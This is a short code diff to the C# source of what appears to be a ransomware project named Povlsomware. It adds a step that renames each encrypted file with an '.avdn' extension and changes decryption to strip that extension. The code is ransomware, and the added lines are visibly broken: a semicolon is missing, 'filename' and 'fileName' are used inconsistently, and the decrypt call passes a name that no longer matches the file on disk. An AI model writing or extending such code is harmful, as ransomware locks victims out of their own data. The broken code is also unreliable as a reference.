@@ -208,6 +208,9 @@ namespace Povlsomware
                 try
                 {
                     EncryptFile(fileName);
+                    string ext = ".avdn"
+                    newfilename = filename + ext;
+                    File.Move(fileName,newfilename);
                 }
                 catch
                 {
@@ -217,7 +220,8 @@ namespace Povlsomware
             {
                 try
                 {
-                    DecryptFile(fileName, password);
+                    string originalFileName = fileName.Substring(0, filename.IndexOf(".avdn"));
+                    DecryptFile(originalFileName, password);
                 }
                 catch
                 {
